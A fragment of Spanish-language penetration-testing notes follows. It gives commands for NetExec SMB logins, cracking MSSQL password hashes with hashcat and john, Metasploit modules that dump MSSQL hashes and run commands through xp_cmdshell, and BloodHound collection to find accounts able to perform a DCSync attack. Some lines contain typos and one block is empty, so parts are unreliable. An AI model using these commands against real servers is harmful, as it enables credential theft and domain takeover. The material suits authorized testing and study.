
```bash 
# No admin 

> nxc smb IP -u 'user' -p 'passwd'  
```

```bash 
# Admin 
> 

```

## MSSQL

```bash 
# Microsoft MSSQL usa el protocolo SALT para generar una palabra aleatoria con el fin de prevenir las 'Rainbow Tables'

      0x0200 4D149B EDDBC10DEA544E18E2B8046D61484AE3FF7
      # Content Header = 0x0200
      # SALT = 4D149B
      # HASH = EDDBC10DEA544E18E2B8046D61484AE3FF7 
```

```bash 
> hashcat -m 1731 --force -a 0 hash rockyou.txt    # Crackear un hash 
> john --format=mssql12 -w:/usr/share/wordlist/rockyou.txt hash 
```

## Metasploit

```bash 
> msqfoncole -q   
	> use auxiliary/admin/mssql/mssql_sql  # Muestra los hashes de las passwds de los usuarios del motor de la DB 
	> set RHOST IP
	> set PASSWORD passwd 
	> set select password_hash from sys.sql_logins   # Sentencia SQL 
	> exploit 
```

```bash 
> msfconsole -q 
	> use auxiliary/admin/mssql/mssql_enum    # Enumerar todas las caracteristicas del motor de la DB (xp_cmdshell)
	> set PASSWORD passwd 
	> set RHOST IP
	> exploit 
```

```bash 
> msfconsole -q 
	> use auxiliary/admin/mssql/mssql_exec    # Ejecutar comandos si esta activo el xp_cmdshell  
	> set RHOST IP
	> set PASSWORD passwd 
	> set cmd "ipconfig"             # Agregar comandos 
	> exploit 
```

## Ataque de privilegios 'DCSYNC'

```bash 
# Obtener usuarios validos y analizar si alguno de ellos tiene los permisos necesarios para hacer el ataque de DCSync 

Pasos:
> bloodhound          # Iniciarlizar BloodHound
# Recolectar informacion del DC 
> bloodhound-python -c All -u 'user' -p 'passwd' -d domain.corp -ns IP  
```
